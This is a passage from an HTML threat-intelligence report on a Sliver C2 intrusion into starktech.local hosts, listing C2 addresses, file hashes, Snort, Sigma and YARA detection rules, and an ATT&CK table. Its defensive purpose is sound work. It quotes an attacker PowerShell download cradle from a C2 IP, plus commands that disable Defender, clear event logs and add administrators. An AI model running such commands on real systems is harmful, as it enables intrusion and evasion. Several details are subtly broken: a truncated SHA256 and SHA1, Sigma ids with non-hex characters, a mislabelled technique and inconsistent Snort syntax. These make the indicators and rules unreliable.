: 8883</p><p id="1dbb727b-1373-80c6-8ff0-e7f7fa7bebf0" class="">- 35.226.173.183 : 8000</p><p id="1dbb727b-1373-80c1-85d2-f68f3db659be" class="">- 104.21.76.201 : 8443</p></li></ul></li></ul><ul id="1dbb727b-1373-8054-a32e-dc22f510073a" class="bulleted-list"><li style="list-style-type:disc"><strong>Capabilities / TTPs</strong>:<ul id="1dbb727b-1373-8092-9580-c41c8a21a345" class="bulleted-list"><li style="list-style-type:circle">T1059.001 PowerShell</li></ul><ul id="1dbb727b-1373-8024-be2e-d91ccad96c2c" class="bulleted-list"><li style="list-style-type:circle">T1059.003 Command Shell</li></ul><ul id="1dbb727b-1373-80ca-b5ad-f3af09d98dc0" class="bulleted-list"><li style="list-style-type:circle">T1070.001 Clear Windows Event Logs</li></ul><ul id="1dbb727b-1373-808f-906a-dab5d8772f18" class="bulleted-list"><li style="list-style-type:circle">T1003 LSASS Credential Dumping</li></ul><ul id="1dbb727b-1373-80d6-8984-c6f9b26ea7a9" class="bulleted-list"><li style="list-style-type:circle">T1573.001 Inbound/Exec/Memory</li></ul><ul id="1dbb727b-1373-80dd-9cd0-ff2f19013d69" class="bulleted-list"><li style="list-style-type:circle">Python memory module loading</li></ul><ul id="1dbb727b-1373-801f-a00a-febe78f7c07f" class="bulleted-list"><li style="list-style-type:circle">Rclone &amp; admin shares</li></ul></li></ul><ul id="1dbb727b-1373-80f2-8187-cfda523bef10" class="bulleted-list"><li style="list-style-type:disc"><strong>Victim</strong>:<ul id="1dbb727b-1373-8000-a157-e88039671770" class="bulleted-list"><li style="list-style-type:circle">desktop6.starktech.local</li></ul><ul id="1dbb727b-1373-80dc-9287-c564cbb22baf" class="bulleted-list"><li style="list-style-type:circle">files5.starktech.local</li></ul><ul id="1dbb727b-1373-80da-b764-e22273d9f0e4" class="bulleted-list"><li style="list-style-type:circle">dc1.starktech.local</li></ul></li></ul><hr id="1dab727b-1373-800f-98b6-e311640f5b46"/><h2 id="1dbb727b-1373-8085-9b5f-c7d960e05c32" class=""><br/>Indicators<br/></h2><h3 id="1dab727b-1373-80bd-8034-f70394873ffe" class="">Atomic</h3><ul id="1dab727b-1373-808f-b6d7-c51a501f5545" class="bulleted-list"><li style="list-style-type:disc"><strong>Domains:</strong><ul id="1dab727b-1373-80c5-a84d-e2204a406d26" class="bulleted-list"><li style="list-style-type:circle"><code>agegamepay.com</code></li></ul><ul id="1dab727b-1373-80bb-8839-da55b10b2cd0" class="bulleted-list"><li style="list-style-type:circle"><code>pastebin.com/mLnJhEzb</code></li></ul></li></ul><ul id="1dab727b-1373-8095-9f6b-f3462ea62b61" class="bulleted-list"><li style="list-style-type:disc"><strong>IP Addresses &amp; Ports:</strong><ul id="1dab727b-1373-806e-90c0-e836fbde22b8" class="bulleted-list"><li style="list-style-type:circle"><code>34.29.169.45:8883</code></li></ul><ul id="1dab727b-1373-80e8-82eb-fa9e011282fc" class="bulleted-list"><li style="list-style-type:circle"><code>172.67.200.49:8443</code></li></ul><ul id="1dab727b-1373-80d0-ba41-c241577472db" class="bulleted-list"><li style="list-style-type:circle"><code>104.21.76.201:8443</code></li></ul><ul id="1dab727b-1373-80aa-999e-cb94ba00224c" class="bulleted-list"><li style="list-style-type:circle"><code>35.226.173.183:8000</code></li></ul></li></ul><ul id="1dab727b-1373-806b-a705-ed5d04f5aff2" class="bulleted-list"><li style="list-style-type:disc"><strong>Files &amp; Registry Paths:</strong><ul id="1dab727b-1373-8056-9e6a-e6bbc411eb32" class="bulleted-list"><li style="list-style-type:circle"><code>C:\Users\ADMIN1~1.FIL\AppData\Local\Temp\iexploreplugin.exe</code></li></ul><ul id="1dab727b-1373-807b-a54d-faa31fe92411" class="bulleted-list"><li style="list-style-type:circle"><code>C:\ProgramData\python\pythonw.exe</code></li></ul><ul id="1dab727b-1373-80fc-b873-d965eecfb616" class="bulleted-list"><li style="list-style-type:circle"><code>C:\ProgramData\python\python311.dll</code></li></ul><ul id="1dab727b-1373-8077-bd64-fa2e57270b4f" class="bulleted-list"><li style="list-style-type:circle"><code>C:\Users\Public\rclone+config.zip</code></li></ul><ul id="1dab727b-1373-808e-94ae-fb4993b5a625" class="bulleted-list"><li style="list-style-type:circle">Registry keys under <code>HKLM:\SOFTWARE\Classes\Applications\iexploreplugin.exe\shell\open\command</code></li></ul></li></ul><h3 id="1dab727b-1373-8012-928b-eff4a5f57126" class="">Computed</h3><ul id="1dab727b-1373-803a-ada2-db037dc77744" class="bulleted-list"><li style="list-style-type:disc"><strong>File Hashes:</strong><ul id="1dab727b-1373-8063-8e35-c897ceb1a21f" class="bulleted-list"><li style="list-style-type:circle"><code>iexploreplugin.exe</code> (SHA256): <code>2bc401b796d57d303d1855b19c398d5103c711fa2c5e6439e8663a05969b959</code></li></ul><ul id="1dab727b-1373-8014-8b81-ea7d64aff1e3" class="bulleted-list"><li style="list-style-type:circle"><code>python311.dll</code> (SHA256): <code>0817A2A657A24C0D5FBB60DF56960F42FC66B3039D522EC952DAB83E2D869364</code></li></ul><ul id="1dab727b-1373-80de-9257-fb16361a388a" class="bulleted-list"><li style="list-style-type:circle"><code>rclone+config.zip</code> (SHA1): <code>BB2664B094923F08FC2F2BA363C4C28833DC07</code></li></ul></li></ul><ul id="1dab727b-1373-805d-be96-f5272ee3b256" class="bulleted-list"><li style="list-style-type:disc"><strong>Imphash:</strong> <code>58719147041FE606491D4732E2DEE131</code></li></ul><hr id="1dab727b-1373-80a4-b744-fbddb8cad03d"/><h1 id="1dab727b-1373-8087-96bf-faaeadb23d61" class="">Detection</h1><h2 id="1dab727b-1373-801d-b5d0-c91aad48cbc0" class="">Network</h2><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="1dab727b-1373-80c3-b62e-f1a679040c5d" class="code"><code class="language-SQL" style="white-space:pre-wrap;word-break:break-all"># 1. Detect Sliver raw TCP C2 over port 8000
+alert tcp any any -&gt; 35.226.173.183 8000 (msg:&quot;Sliver C2 raw TCP stream&quot;; flow:established; content:&quot;|53 6C 69 76 65 72|&quot;; depth:8; metadata:attack.t1071.001; sid:1001001; rev:1;)
+
+# 2. Detect ChaCha20‑encrypted HTTPS beacon with Basic Auth header
+alert http any any -&gt; any 8443 (msg:&quot;HTTPS Beacon with Basic‑Auth from agegamepay.com&quot;; tls_sni; content:&quot;agegamepay.com&quot;; http_header; content:&quot;Authorization\; Basic dGVzdHVzZXI6U3VwM3JQNHNzIQ==&quot;; http_header; metadata:attack.t1573.002; sid:1001002; rev:1;)
+
+# 3. Detect MQTT‑TLS initial payload host
+alert tcp any any -&gt; 34.29.169.45 8883 (msg:&quot;MQTT‑TLS to known staging C2&quot;; flow:established; tls_client_name; content:&quot;34.29.169.45&quot;; metadata:attack.t1071.001; sid:1001003; rev:1;)
+
+# 4. Detect rclone exfil to remote cloud storage
+alert http any any -&gt; any any (msg:&quot;Possible rclone exfil traffic&quot;; flow:established; content:&quot;User-Agent\; rclone/1.69&quot;; http_header; metadata:attack.t1567.002; sid:1001004; rev:1;)
+
+# 5. Detect paste.sh PS download cradle
+alert http any any -&gt; any any (msg:&quot;PowerShell download from paste.sh&quot;; flow:to_client,established; content:&quot;GET /raw/&quot;; http.uri; content:&quot;paste.sh&quot;; http.host; metadata:attack.t1204.002; sid:1001005; rev:1;)
+
+# 6. Detect PS1 download via raw MQTT‑TLS port
+alert tcp any any -&gt; any 8883 (msg:&quot;PowerShell Paste.sh PS1 download via raw MQTT‑TLS port&quot;; flow:established; content:&quot;GET /&quot;; http_uri; content:&quot;paste.sh&quot;; tls_client_name; sid:1001006; rev:1;)
+
+# 7. Detect GitHub Gist pull of PowerShell scripts
+alert tcp any any -&gt; gist.githubusercontent.com 443 (msg:&quot;Gist‑hosted PowerShell fetch&quot;; flow:established; tls_sni; content:&quot;gist.githubusercontent.com&quot;; http_uri; content:&quot;.ps1&quot;; sid:1001007; rev:1;)
+
+# 8. Detect MegaCMD exfil over WebDAV‐like shares
+alert tcp any any -&gt; any 80 (msg:&quot;MegaCMD file upload pattern&quot;; flow:established; content:&quot;PUT&quot;; http_method; content:&quot;mega:&quot;; http_uri; sid:1001008; rev:1;)
+
+# 9. Detect SplashtopProvider DLL removal via SetupUtil.exe
+alert tcp any any -&gt; any any (msg:&quot;Splashtop event provider removal via SetupUtil&quot;; flow:to_server; content:&quot;SetupUtil.exe&quot;; content:&quot;/P_ST_EVENT&quot;; sid:1001009; rev:1;)
+
+# 10. Detect MSI download via msiexec for RMM tools
+alert tcp any any -&gt; any any (msg:&quot;MSI download via msiexec for RMM tools&quot;; flow:established; content:&quot;msiexec&quot;; content:&quot;.msi&quot;; sid:1001010; rev:1;)
+</code></pre><h2 id="1dab727b-1373-807e-a22b-e17c937cac42" class="">Sigma</h2><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="1dab727b-1373-809b-9de3-f4e25f64d33a" class="code"><code class="language-SQL" style="white-space:pre-wrap;word-break:break-all"># 1. PowerShell HTTP Download Cradle
+title: PowerShell HTTP Download Cradle
+id: 12345678-90ab-cdef-1234-567890abcdef
+description: Detects PowerShell one-liners downloading from uncommon domains/IPs
+status: stable
+author: DFIR Team
+logsource:
+  product: windows
+  service: security
+detection:
+  selection:
+    EventID: 800
+    Channel: Windows PowerShell
+    ScriptBlockText|contains:
+      - &quot;iwr -uri http://34.29.169.45:8883/iexploreplugin.exe&quot;
+      - &quot;Expand-Archive&quot;
+  condition: selection
+tags:
+  - attack.execution
+  - attack.ingresstooltransfer
+
+# 2. AteraAgent Watchdog Task Creation
+title: AteraAgent Watchdog Task Creation
+id: 8d13e7c4-9aef-4b10-8f4f-2b5a12345678
+description: Detects creation of the AteraAgentServiceWatchdog scheduled task
+status: experimental
+author: DFIR Team
+logsource:
+  category: process_creation
+  product: windows
+detection:
+  selection:
+    CommandLine|contains: &#x27;AteraAgentServiceWatchdog&#x27;
+    Image|endswith: &#x27;\schtasks.exe&#x27;
+  condition: selection
+tags:
+  - attack.persistence
+  - attack.t1053.005
+
+# 3. Image File Execution Options Hijack
+title: Image File Execution Options Hijack
+id: b9a3c2f7-11d0-4e2c-9e2c-abcdef012345
+description: Detects registry modification under IFEO for unexpected executables
+status: experimental
+author: DFIR Team
+logsource:
+  category: registry
+  product: windows
+detection:
+  selection:
+    TargetObject|startswith: &#x27;HKLM:\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\iexploreplugin.exe&#x27;
+    Details|contains: &#x27;Debugger&#x27;
+  condition: selection
+tags:
+  - attack.persistence
+  - attack.t1546.015
+
+# 4. Python Side‑Load via pythonw.exe
+title: Python Side‑Load via pythonw.exe
+id: c6e5f4a2-3b2d-4f6d-9c1e-abcdef987654
+description: Detects pythonw.exe launching with unexpected DLL in same directory
+status: experimental
+author: DFIR Team
+logsource:
+  category: process_creation
+  product: windows
+detection:
+  selection:
+    Image|endswith: &#x27;\\pythonw.exe&#x27;
+    CommandLine|contains: &#x27;python311.dll&#x27;
+  condition: selection
+tags:
+  - attack.execution
+  - attack.t1574.002
+
+# 5. Clearing Windows Event Logs via wevtutil
+title: Clearing Windows Event Logs via wevtutil
+id: f7d8a10b-5563-4c7d-8eaf-abcdef123456
+description: Detects use of wevtutil.exe to clear critical operational logs
+status: stable
+author: DFIR Team
+logsource:
+  category: process_creation
+  product: windows
+detection:
+  selection:
+    Image|endswith: &#x27;\\wevtutil.exe&#x27;
+    CommandLine|all:
+      - &#x27;cl Microsoft-Windows-Sysmon/Operational&#x27;
+      - &#x27;cl Microsoft-Windows-StorageManagement/Operational&#x27;
+      - &#x27;cl Microsoft-Windows-Subsys-SMSS/Operational&#x27;
+  condition: selection
+tags:
+  - attack.defense_evasion
+  - attack.t1070.001
+
+# 6. Splashtop Event Provider DLL Removal
+title: Splashtop Event Provider DLL Removal
+id: 1f2e3d4c-5b6a-7c8d-9e0f-abcdef111213
+description: Detects use of SetupUtil.exe to remove Splashtop’s event DLL
+status: production
+author: DFIR Team
+logsource:
+  category: process_creation
+  product: windows
+detection:
+  selection:
+    Image|endswith: &#x27;\\SetupUtil.exe&#x27;
+    CommandLine|contains: &#x27;/P_ST_EVENT&#x27;
+  condition: selection
+tags:
+  - attack.defense_evasion
+  - attack.t1562.001
+
+# 7. AnyDesk MSI Install as SYSTEM
+title: AnyDesk MSI Install as SYSTEM
+id: 2b3c4d5e-6f7a-8b9c-0d1e-abcdef141516
+description: Detects installation of AnyDesk via MSI under SYSTEM context
+status: experimental
+author: DFIR Team
+logsource:
+  category: process_creation
+  product: windows
+detection:
+  selection:
+    User: &#x27;SYSTEM&#x27;
+    Image|endswith: &#x27;\\msiexec.exe&#x27;
+    CommandLine|contains: &#x27;AnyDesk&#x27;
+  condition: selection
+tags:
+  - attack.persistence
+  - attack.t1218.011
+
+# 8. Disable Windows Defender Real‑Time Monitoring
+title: Disable Windows Defender Real‑Time Monitoring
+id: 3c4d5e6f-7a8b-9c0d-1e2f-abcdef171819
+description: Detects PowerShell disabling of Defender real‑time monitoring
+status: stable
+author: DFIR Team
+logsource:
+  category: powershell
+  product: windows
+detection:
+  selection:
+    ScriptBlockText|contains: &#x27;Set-MpPreference -DisableRealtimeMonitoring&#x27;
+  condition: selection
+tags:
+  - attack.defense_evasion
+  - attack.t1562.001
+
+# 9. Scheduled Task Creation for AteraAgentServiceWatchdog
+title: Scheduled Task Creation for AteraAgentServiceWatchdog
+id: 4d5e6f7a-8b9c-0d1e-2f3g-abcdef202122
+description: Detects new scheduled task named AteraAgentServiceWatchdog
+status: production
+author: DFIR Team
+logsource:
+  category: process_creation
+  product: windows
+detection:
+  selection:
+    Image|endswith: &#x27;\\schtasks.exe&#x27;
+    CommandLine|contains: &#x27;AteraAgentServiceWatchdog&#x27;
+  condition: selection
+tags:
+  - attack.persistence
+  - attack.t1053.005
+
+# 10. LSASS Process Access for Credential Dumping
+title: LSASS Process Access for Credential Dumping
+id: 5e6f7a8b-9c0d-1e2f-3g4h-abcdef232425
+description: Detects processes opening lsass.exe with VM_READ
+status: experimental
+author: DFIR Team
+logsource:
+  category: process_access
+  product: windows
+detection:
+  selection:
+    TargetImage|endswith: &#x27;\\lsass.exe&#x27;
+    GrantedAccess|contains: &#x27;0x0010&#x27;
+  condition: selection
+tags:
+  - attack.credential_access
+  - attack.t1003.001
+</code></pre><h2 id="1dab727b-1373-808f-80fa-ce4a04a80605" class="">YARA</h2><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="1dab727b-1373-804e-80d5-ebdd12b84255" class="code"><code class="language-SQL" style="white-space:pre-wrap;word-break:break-all">// 1. Suspicious Sliver Loader
+rule Suspicious_Sliver_Loader
+{
+    meta:
+        author = &quot;DFIR Team&quot;
+        description = &quot;Detects Sliver loader file named iexploreplugin.exe&quot;
+        hash = &quot;2bc401b796d57d303d1855b19c398d5103c711fa2c5e6439e8663a05969b959&quot;
+    strings:
+        $mz        = { 4D 5A }
+        $sliver_tag = &quot;SLiVeR&quot; ascii ignorecase
+        $fake_ie   = &quot;iexploreplugin.exe&quot; ascii
+    condition:
+        $mz at 0 and ($sliver_tag or $fake_ie)
+}
+
+// 2. Python311.dll Stager
+rule Python311_DLL_Stager
+{
+    meta:
+        author = &quot;DFIR Team&quot;
+        description = &quot;Detects side‑loaded python311.dll for malicious stager&quot;
+        hash = &quot;0817A2A657A24C0D5FBB60DF56960F42FC66B3039D522EC952DAB83E2D869364&quot;
+    strings:
+        $mz         = { 4D 5A }
+        $python_dll = &quot;python311.dll&quot; ascii
+        $import_pow = &quot;Py_Initialize&quot; ascii
+    condition:
+        $mz at 0 and $python_dll and $import_pow
+}
+
+// 3. Mimikatz Injection Modules
+rule Mimikatz_Injection_Modules
+{
+    meta:
+        author = &quot;DFIR Team&quot;
+        description = &quot;Detects known Mimikatz modules injected into processes&quot;
+    strings:
+        $powl = &quot;powerkatz.dll&quot; ascii
+        $hdmp = &quot;hashdump.x64.dll&quot; ascii
+    condition:
+        any of ($powl, $hdmp)
+}
+
+// 4. Gist‑hosted PowerShell Downloader
+rule Gist_PS_Downloader
+{
+    meta:
+        author = &quot;DFIR Team&quot;
+        description = &quot;Detects PS script fetching from GitHub Gist used for DC compromise&quot;
+    strings:
+        $gisturl = &quot;gist.githubusercontent.com/tsale&quot; ascii
+        $iwr     = &quot;Invoke-WebRequest&quot; ascii
+    condition:
+        $gisturl and $iwr
+}
+
+// 5. AteraAgent Scheduled Task XML
+rule AteraAgentScheduledTask
+{
+    meta:
+        author = &quot;DFIR Team&quot;
+        description = &quot;Identifies AteraAgentServiceWatchdog Scheduled Task XML&quot;
+    strings:
+        $xml_tag = &quot;&lt;Name&gt;AteraAgentServiceWatchdog&lt;/Name&gt;&quot; ascii
+        $binpath = /&lt;Command&gt;.*AteraAgent\.exe&lt;\/Command&gt;/ 
+    condition:
+        $xml_tag and $binpath
+}
+
+// 6. AnyDesk MSI Dropper
+rule AnyDesk_MSI_Dropper
+{
+    meta:
+        author = &quot;DFIR Team&quot;
+        description = &quot;Matches AnyDesk MSI installer payload&quot;
+    strings:
+        $msi = &quot;AnyDeskInstaller.msi&quot; ascii
+        $svc = &quot;AnyDeskService.exe&quot; ascii
+    condition:
+        any of ($msi, $svc)
+}
+
+// 7. Python Stager Archive
+rule Python_Stager_Archive
+{
+    meta:
+        author = &quot;DFIR Team&quot;
+        description = &quot;Detects the python.zip containing Sliver stager&quot;
+    strings:
+        $zip_hdr   = { 50 4B 03 04 }
+        $py_module = &quot;testc.py&quot; ascii
+    condition:
+        $zip_hdr at 0 and $py_module
+}
+
+// 8. Rclone Config ZIP
+rule Rclone_Config_ZIP
+{
+    meta:
+        author = &quot;DFIR Team&quot;
+        description = &quot;Detects rclone+config.zip used for cloud exfil&quot;
+    strings:
+        $rclone_cfg = &quot;rclone+config.zip&quot; ascii
+        $mega_mount = &quot;mega:V1A&quot; ascii
+    condition:
+        $rclone_cfg or $mega_mount
+}
+
+// 9. Splashtop Provider Removal
+rule Splashtop_Provider_Removal
+{
+    meta:
+        author = &quot;DFIR Team&quot;
+        description = &quot;Matches SetupUtil invocation removing SplashtopProvider.dll&quot;
+    strings:
+        $setup  = &quot;SetupUtil.exe&quot; ascii
+        $remove = &quot;/P_ST_EVENT&quot; ascii
+    condition:
+        $setup and $remove
+}</code></pre><hr id="1dab727b-1373-80de-a902-ea50ead8138c"/><h1 id="1dab727b-1373-80bc-ae22-fa1ec77d4d8d" class="">MITRE ATT&amp;CK</h1><hr id="1dab727b-1373-807a-86d2-e9a37e6b7346"/><table id="1dab727b-1373-801f-8e76-ee324e2d948d" class="simple-table"><tbody><tr id="1dab727b-1373-80a5-9c2d-ca817fdec6f7"><td id="EAQ=" class="">Tactic</td><td id="[B=f" class="" style="width:288.9375px">Tools </td><td id="en}p" class="" style="width:563px">Technique (T‑Code)</td></tr><tr id="1dab727b-1373-80e8-8b2e-f17d992300ea"><td id="EAQ=" class=""><strong>Initial Access</strong></td><td id="[B=f" class="" style="width:288.9375px">• paste.sh PowerShell one‑liner in Edge• iwr/Invoke‑WebRequest</td><td id="en}p" class="" style="width:563px">• User Execution – T1204.002• Spearphishing Link – T1566.001</td></tr><tr id="1dab727b-1373-808a-b7e7-fdbf0bd218ca"><td id="EAQ=" class=""><strong>Execution</strong></td><td id="[B=f" class="" style="width:288.9375px">• PowerShell (<code>powershell.exe</code>)• Windows Installer (<code>msiexec.exe</code>)• Python embeddable (<code>python.exe</code>/<code>pythonw.exe</code>)</td><td id="en}p" class="" style="width:563px">• PowerShell – T1059.001• Windows Command Shell – T1059.003• Signed Binary Proxy Execution – T1218.011• Service Execution – T1569.002</td></tr><tr id="1dab727b-1373-80ff-8215-dd9faf5b6537"><td id="EAQ=" class=""><strong>Persistence</strong></td><td id="[B=f" class="" style="width:288.9375px">• AteraAgent service install• Splashtop/AnyDesk service install• Scheduled Tasks (Atera watchdog &amp; upgrades)</td><td id="en}p" class="" style="width:563px">• New Service – T1543.003• Scheduled Task/Job – T1053.005</td></tr><tr id="1dab727b-1373-8096-8ba9-ee7840f377ac"><td id="EAQ=" class=""><strong>Privilege Escalation</strong></td><td id="[B=f" class="" style="width:288.9375px">• <code>msiexec /i … /qn</code> as SYSTEM• <code>net localgroup administrators /add</code></td><td id="en}p" class="" style="width:563px">• Abuse Elevation Control Mechanism – T1548• Create or Modify System Process – T1543.003</td></tr><tr id="1dab727b-1373-8033-afa0-f56827ab7abc"><td id="EAQ=" class=""><strong>Defense Evasion</strong></td><td id="[B=f" class="" style="width:288.9375px">• <code>wevtutil.exe cl …</code> to clear logs• <code>Set‑MpPreference –DisableRealtimeMonitoring</code>• <code>Export‑ModuleMember Remove‑MpBehavioralNetworkBlockingRules</code>• Disable Splashtop event provider</td><td id="en}p" class="" style="width:563px">• Clear Windows Event Logs – T1070.001• Impair Defenses (Disable Windows Defender) – T1562.001• Impair Defenses: Disable Event Logging – T1562.006</td></tr><tr id="1dab727b-1373-80b5-922d-d09252f7acc2"><td id="EAQ=" class=""><strong>Credential Access</strong></td><td id="[B=f" class="" style="width:288.9375px">poolsv.exe → lsass.exe access; in-memory LaZagne, DonPAPI, SecretsDump; Impacket secretsdump</td><td id="en}p" class="" style="width:563px">T1003.006 – OS Credential Dumping: LSASS MemoryT1555.002 – Credentials from Password Stores</td></tr><tr id="1dab727b-1373-80f9-9ce4-e1dd77c1a395"><td id="EAQ=" class=""><strong>Discovery</strong></td><td id="[B=f" class="" style="width:288.9375px">• <code>netstat.exe</code>• <code>net.exe group</code>• <code>findstr.exe</code>• <code>whoami.exe</code></td><td id="en}p" class="" style="width:563px">• System Network Connections Discovery – T1049• System Information Discovery – T1082• File and Directory Discovery – T1083</td></tr><tr id="1dab727b-1373-80c7-a16f-c414db55b2e8"><td id="EAQ=" class=""><strong>Lateral Movement</strong></td><td id="[B=f" class="" style="width:288.9375px">• PowerShell <code>Invoke-Command</code> (WinRM)• Splashtop/AnyDesk remote sessions• SMB shares (<code>net use \\…</code>)</td><td id="en}p" class="" style="width:563px">• Remote Services – T1021.002 (SMB)• Windows Remote Management – T1021.006</td></tr><tr id="1dab727b-1373-8046-9d73-c89c9c573b9e"><td id="EAQ=" class=""><strong>Collection</strong></td><td id="[B=f" class="" style="width:288.9375px">• Python in‑memory modules (BloodHound, LaZagne, DonPAPI)• Rclone</td><td id="en}p" class="" style="width:563px">• Data from Local System – T1005• Automated Collection – T1119</td></tr><tr id="1dab727b-1373-80c6-a5a3-fe5e85afd556"><td id="EAQ=" class=""><strong>Command and Control</strong></td><td id="[B=f" class="" style="width:288.9375px">• <code>pythonw.exe</code> fetching modules from <code>agegamepay.com:8443</code> via HTTP• Custom ChaCha20 encryption/decryption in‑memory</td><td id="en}p" class="" style="width:563px">• Application Layer Protocol – T1071.001• Encrypted Channel – T1573.002</td></tr><tr id="1dab727b-1373-800b-8731-cdab24f7900b"><td id="EAQ=" class=""><strong>Exfiltration</strong></td><td id="[B=f" class="" style="width:288.9375px">• Rclone over HTTPS to cloud storage (mega, Teams share)</td><td id="en}p" class="" style="width:563px">• Exfiltration Over Web Service – T1567.002</td></tr><tr id="1dab727b-1373-80cc-bb74-eaeedb6aa88b"><td id="EAQ=" class=""><strong>Impact</strong></td><td id="[B=f" class="" style="width:288.9375px">• Log clearing &amp; Defender disabling• Service stops/restarts (Atera)</td><td id="en}p" class="" style="width:563px">• Inhibit System Recovery – T1490• Data Destruction – T1485</td></tr></tbody></table><hr id="1dab727b-1373-8035-b381-d01970b79161"/><p id="1dab727b-1373-801a-acd0-d14b02e73f67" class=""> Copyright © 2025 The DFIR Report. All Rights Reserved</p><p id="1dab727b-1373-8027-8f31-c9d5a37d860e" class="">
+</p><p id="1dbb727b-1373-8025-98ae-d77d0b4e7bc4" class="">
+</p></div></article><span class="sans" style="font-size:14px;padding-top:2em"></span></body></html>
